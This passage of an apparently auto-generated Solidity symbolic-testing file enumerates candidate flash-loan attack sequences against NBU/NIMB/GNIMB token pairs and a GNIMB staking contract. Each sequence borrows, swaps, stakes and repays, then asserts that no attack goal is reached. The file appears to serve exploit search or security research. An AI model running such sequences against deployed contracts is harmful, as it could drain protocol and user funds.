        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5034(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5035(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5036(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5037(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5038(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5039(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5040(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5041(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5042(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5043(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5044(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5045(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5046(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5047(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5048(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5049(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5050(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5051(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5052(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5053(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5054(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5055(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5056(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5057(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5058(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5059(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5060(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5061(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5062(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
